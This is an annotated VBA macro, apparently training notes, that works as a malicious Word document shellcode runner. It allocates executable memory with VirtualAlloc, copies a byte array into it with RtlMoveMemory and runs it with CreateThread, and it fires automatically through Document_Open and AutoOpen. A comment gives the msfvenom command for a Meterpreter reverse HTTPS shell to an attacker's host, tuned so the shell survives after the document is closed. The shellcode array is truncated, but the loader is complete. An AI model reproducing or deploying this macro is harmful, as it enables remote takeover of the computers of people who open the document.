'first declear three functions - VirtualAlloc, RtlMoveMemory, and CreateThread

'LPVOID VirtualAlloc(
'LVOID lpAddress, -> set this to "0", the API will choose the location
'SIZE_T dwSize,   -> size of the allocation
'DWORD flAllocationType, -> allocation type  
'DWORD flProtect -> memory protection
');

'VOID RtlMoveMemory(
'VOID UNALIGNED *Destination, -> memory pointer, points to the newly allocated buffer 
'VOID UNALIGNED *Source, -> address of an element from the shell code array, passed by reference,
'SIZE_T Length -> pass by value
'); -> return 

'HANDLE CreateThread(
'LPSECURITY_ATTRIBUTES lpThreadAttributes, -> not Default setting, set to 0
'SIZE_T dwStackSize, -> not default setting, set to 0
'LPTHREAD_START_ROUTINE lpStartAddress, start address for code execution, LongPtr
'LPVOID lpParameter, -> pointer to arguments for the shell code, set to 0 and type LongPtr
'DWORD dwCreationFlags, -> 
'LPDWORD lpThreadId
');


' declear all functions
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

' declear all the function return values
' buf is the shellcode, addr is the start address pointer return by VirtualAlloc
' res -> execute the shell code 
Function MyMacro()
	Dim buf As Variant
	Dim addr As LongPtr
	Dim counter As Long
	Dim data As Long
	Dim res As Long

'skip the full shell code. msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 EXITFUNC=thread -f vbapplication
'EXITFUNC=thread to pervent the shell close when the user close the word doc.
	buf = Array(232, 130, 0, 0, 0, 96, 137)
	
'allocate the address for shell code
'0x3000 or &H3000 in vba, which equates to the allocation type enums of MEM_COMMIT and MEM_RESERVE. This will make the operating system allocate the desired memory for us and make it available
'&H40 (0x40), indicating that the memory is readable, writable, and executable.
	addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
	
'copy each element of byte array in for loop
	For counter = LBound(buf) To UBound(buf)
		data = buf(counter)
		res = RtlMoveMemory(addr + counter, data, 1)
	Next counter
	
'execute the shell code after copy them into memory
	res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub	
	